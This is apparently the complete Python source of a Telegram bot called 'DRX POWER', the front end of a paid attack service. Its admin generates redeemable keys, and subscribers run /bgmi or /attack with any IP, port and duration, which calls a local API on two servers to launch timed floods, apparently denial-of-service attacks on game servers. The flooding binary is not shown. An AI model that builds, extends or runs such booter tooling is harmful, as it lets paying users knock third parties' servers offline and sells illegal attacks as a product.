# ═══════════════════════════════════════════════════════════
#   👑 DRX POWER BOT — FULL WORKING VERSION
#   Telegram Bot + Flask API + C Binary Attack System
# ═══════════════════════════════════════════════════════════

import telebot
from telebot.types import BotCommand, InlineKeyboardMarkup, InlineKeyboardButton
import json
import requests
import datetime
import os
import time
import socket
import threading

# ─── LOAD CONFIG ───────────────────────────────────────────
if os.path.exists('config.json'):
    with open('config.json') as f:
        config = json.load(f)
else:
    print("Error: config.json file nahi mili!")
    exit()

bot = telebot.TeleBot(config['token'])

# ─── API CONFIG ────────────────────────────────────────────
API_URL = "http://127.0.0.1:8080/hit"
AUTH_TOKEN = "DRX_POWER_ULTRA_V4"

# ─── DATABASE FILES ────────────────────────────────────────
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"

# ─── DATA FUNCTIONS ────────────────────────────────────────
def load_data(file):
    if os.path.exists(file):
        with open(file, 'r') as f:
            return json.load(f)
    return {}

def save_data(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=4)

# ─── SET BOT MENU ──────────────────────────────────────────
def set_bot_menu():
    try:
        commands = [
            BotCommand("start", "Start the bot"),
            BotCommand("menu", "Show main menu"),
            BotCommand("attack", "DM attack: /attack IP PORT TIME"),
            BotCommand("bgmi", "Group attack: /bgmi IP PORT TIME"),
            BotCommand("status", "Server status"),
            BotCommand("statusv2", "Live server status"),
            BotCommand("help", "Show all commands"),
            BotCommand("redeem", "Redeem a key"),
            BotCommand("myinfo", "Your plan info"),
        ]
        bot.set_my_commands(commands)
        print("[+] Bot menu set successfully")
    except Exception as e:
        print(f"[!] Menu set error: {e}")

set_bot_menu()

# ─── COMMANDS ──────────────────────────────────────────────
@bot.message_handler(commands=['start'])
def welcome(m):
    bot.reply_to(m, "🔥 **DRX POWER Bot Active**\n\nWelcome! Use /help to see command list.")

@bot.message_handler(commands=['help'])
def help_cmd(m):
    help_text = """
🚀 **Available Commands:**
/bgmi <ip> <port> <time> - Start Attack
/redeem <key> - Activate Plan
/myinfo - Check your Plan
/status - Current Attack Status
/menu - Show main menu

👑 **Admin Only:**
/genkey <duration> - Generate Key (e.g., /genkey 1d)
    """
    bot.reply_to(m, help_text)

@bot.message_handler(commands=['genkey'])
def genkey(m):
    if str(m.from_user.id) != str(config['admin']):
        return bot.reply_to(m, "❌ Admin only command.")
    
    args = m.text.split()
    if len(args) < 2:
        return bot.reply_to(m, "Usage: /genkey 1h, 1d, 1w")
    
    duration = args[1]
    key = "DRX-" + os.urandom(3).hex().upper()
    
    keys = load_data(KEYS_FILE)
    keys[key] = duration
    save_data(KEYS_FILE, keys)
    
    bot.reply_to(m, f"🔑 **Key Generated:** `{key}`\n⏳ **Duration:** {duration}")

@bot.message_handler(commands=['redeem'])
def redeem(m):
    args = m.text.split()
    if len(args) < 2:
        return bot.reply_to(m, "Usage: /redeem DRX-XXXX")
    
    user_key = args[1]
    keys = load_data(KEYS_FILE)
    
    if user_key in keys:
        duration = keys[user_key]
        users = load_data(USERS_FILE)
        
        users[str(m.from_user.id)] = {"plan": duration, "active": True}
        save_data(USERS_FILE, users)
        
        del keys[user_key]
        save_data(KEYS_FILE, keys)
        bot.reply_to(m, f"✅ **Redeemed Successfully!**\nPlan: {duration} active.")
    else:
        bot.reply_to(m, "❌ Invalid or Expired Key.")

@bot.message_handler(commands=['bgmi'])
def attack(m):
    users = load_data(USERS_FILE)
    user_id = str(m.from_user.id)
    
    if user_id not in users or not users[user_id].get('active'):
        return bot.reply_to(m, "❌ **ACCESS DENIED!**\nNo active plan found. Please use /redeem first.")

    args = m.text.split()
    if len(args) != 4:
        return bot.reply_to(m, "❌ **Format:** `/bgmi <IP> <PORT> <TIME>`")
    
    ip, port, attack_time = args[1], args[2], args[3]
    
    try:
        response = requests.get(
            f"{API_URL}?token={AUTH_TOKEN}&ip={ip}&port={port}&time={attack_time}",
            timeout=10
        )
        
        if response.status_code == 200:
            bot.reply_to(
                m,
                f"🚀 **ATTACK STARTED!**\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"🕒 Time: {attack_time}s\n"
                f"💎 Power: DRX ULTRA\n"
                f"📶 Status: API CONNECTED ✅"
            )
            
            start_time = datetime.datetime.now()
            
            def send_finish():
                end_time = datetime.datetime.now()
                start_str = start_time.strftime("%d-%b-%Y %H:%M:%S IST")
                end_str = end_time.strftime("%d-%b-%Y %H:%M:%S IST")
                
                finish_msg = (
                    "✅ **ATTACK COMPLETE** ✅\n\n"
                    f"🎯 **Target:** `{ip}:{port}`\n"
                    f"⏱ **Duration:** {attack_time}s\n"
                    f"🔧 **Method:** A\n"
                    f"🖥 **Server:** 1\n\n"
                    f"📅 **Started:** {start_str}\n"
                    f"📅 **Completed:** {end_str}\n\n"
                    f"👑 **DRX POWER**"
                )
                try:
                    bot.send_message(m.chat.id, finish_msg, parse_mode="Markdown")
                except Exception as e:
                    print(f"[!] Finish message error: {e}")
            
            threading.Timer(int(attack_time), send_finish).start()
        
        else:
            bot.reply_to(m, "❌ **API ERROR!**\nServer responded but with an error.")
    
    except Exception as e:
        print(f"[!] Attack error: {e}")
        bot.reply_to(m, "❌ **VPS OFFLINE!**\nCould not connect to API. `python3 api.py` start hai?")



@bot.message_handler(commands=['attack2'])
def attack2(m):
    users = load_data(USERS_FILE)
    user_id = str(m.from_user.id)

    if user_id not in users or not users[user_id].get('active'):
        return bot.reply_to(m, "❌ ACCESS DENIED! No active plan found.")

    args = m.text.split()
    if len(args) != 4:
        return bot.reply_to(m, "❌ Format: /attack2 <IP> <PORT> <TIME>")

    ip, port, attack_time = args[1], args[2], args[3]

    API2_URL = "http://127.0.0.1:8081/hit"

    try:
        response = requests.get(
            f"{API2_URL}?token={AUTH_TOKEN}&ip={ip}&port={port}&time={attack_time}",
            timeout=10
        )

        if response.status_code == 200:
            bot.reply_to(
                m,
                f"🚀 ATTACK STARTED (SERVER 2)\n"
                f"🎯 Target: {ip}:{port}\n"
                f"🕒 Time: {attack_time}s\n"
                f"📶 Status: SERVER 2 ✅"
            )

            start_time = datetime.datetime.now()

            def send_finish2():
                end_time = datetime.datetime.now()
                start_str = start_time.strftime("%d-%b-%Y %H:%M:%S IST")
                end_str = end_time.strftime("%d-%b-%Y %H:%M:%S IST")

                finish_msg = (
                    f"✅ ATTACK COMPLETE (SERVER 2) ✅\n\n"
                    f"🎯 Target: {ip}:{port}\n"
                    f"⏱ Duration: {attack_time}s\n"
                    f"🖥 Server: 2\n\n"
                    f"📅 Started: {start_str}\n"
                    f"📅 Completed: {end_str}\n\n"
                    f"👑 DRX POWER"
                )
                try:
                    bot.send_message(m.chat.id, finish_msg)
                except Exception as e:
                    print(f"[!] Finish error: {e}")

            threading.Timer(int(attack_time), send_finish2).start()

        else:
            # Server 2 fail — Server 1 pe fallback
            response = requests.get(
                f"{API_URL}?token={AUTH_TOKEN}&ip={ip}&port={port}&time={attack_time}",
                timeout=10
            )
            if response.status_code == 200:
                bot.reply_to(m, f"🚀 ATTACK STARTED (SERVER 1 FALLBACK)\n🎯 {ip}:{port}\n🕒 {attack_time}s")

    except Exception as e:
        try:
            response = requests.get(
                f"{API_URL}?token={AUTH_TOKEN}&ip={ip}&port={port}&time={attack_time}",
                timeout=10
            )
            if response.status_code == 200:
                bot.reply_to(m, f"🚀 ATTACK STARTED (SERVER 1 FALLBACK)\n🎯 {ip}:{port}\n🕒 {attack_time}s")
            else:
                bot.reply_to(m, "❌ BOTH SERVERS OFFLINE")
        except:
            bot.reply_to(m, "❌ BOTH SERVERS OFFLINE")



@bot.message_handler(commands=['attack'])
def attack_alias(m):
    attack2(m)


@bot.message_handler(commands=['myinfo'])
def myinfo(m):
    users = load_data(USERS_FILE)
    user_id = str(m.from_user.id)
    if user_id in users:
        bot.reply_to(m, f"👤 **User Info:**\nPlan: {users[user_id]['plan']}\nStatus: Active ✅")
    else:
        bot.reply_to(m, "❌ No active plan found.")

@bot.message_handler(commands=['status'])
def status(m):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    try:
        s.connect(('127.0.0.1', 8080))
        api_status = "Online 🟢"
        s.close()
    except:
        api_status = "Offline 🔴"
    
    status_text = (
        "📊 **DRX POWER LIVE STATUS**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 **Bot Status:** Active ✅\n"
        f"🔌 **API Connection:** {api_status}\n"
        f"🚀 **VPS Power:** OPTIMIZED\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    bot.reply_to(m, status_text, parse_mode="Markdown")

# ─── MENU COMMANDS ─────────────────────────────────────────
@bot.message_handler(commands=['menu'])
def cmd_menu(m):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🚀 Attack", callback_data="menu_attack"),
        InlineKeyboardButton("🔑 Redeem", callback_data="menu_redeem"),
        InlineKeyboardButton("📊 Status", callback_data="menu_status"),
        InlineKeyboardButton("👤 My Info", callback_data="menu_info"),
        InlineKeyboardButton("📖 Help", callback_data="menu_help"),
    )
    bot.send_message(
        m.chat.id,
        "👑 **DRX POWER — Main Menu**\n\nChoose an option:",
        parse_mode="Markdown",
        reply_markup=kb
    )

@bot.callback_query_handler(func=lambda c: c.data.startswith("menu_"))
def menu_callback(c):
    bot.answer_callback_query(c.id)
    if c.data == "menu_attack":
        bot.send_message(c.message.chat.id, "Use `/bgmi <IP> <PORT> <TIME>`", parse_mode="Markdown")
    elif c.data == "menu_redeem":
        bot.send_message(c.message.chat.id, "Use `/redeem <KEY>`", parse_mode="Markdown")
    elif c.data == "menu_status":
        status(c.message)
    elif c.data == "menu_info":
        myinfo(c.message)
    elif c.data == "menu_help":
        help_cmd(c.message)

# ─── STATUS V2 ─────────────────────────────────────────────
@bot.message_handler(commands=['statusv2'])
def cmd_statusv2(m):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    try:
        s.connect(('127.0.0.1', 8080))
        api_status = "Online 🟢"
        s.close()
    except:
        api_status = "Offline 🔴"
    
    status_text = (
        "📊 **DRX LIVE STATUS v2**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 **Bot Status:** Active ✅\n"
        f"🔌 **API Connection:** {api_status}\n"
        f"🚀 **VPS Power:** OPTIMIZED\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    bot.reply_to(m, status_text, parse_mode="Markdown")

# ─── DM ATTACK (Alias) ─────────────────────────────────────
@bot.message_handler(commands=['attack'])
def dm_attack(m):
    attack(m)

# ─── START POLLING ─────────────────────────────────────────
print("[+] DRX Bot starting...")
bot.polling(none_stop=True)
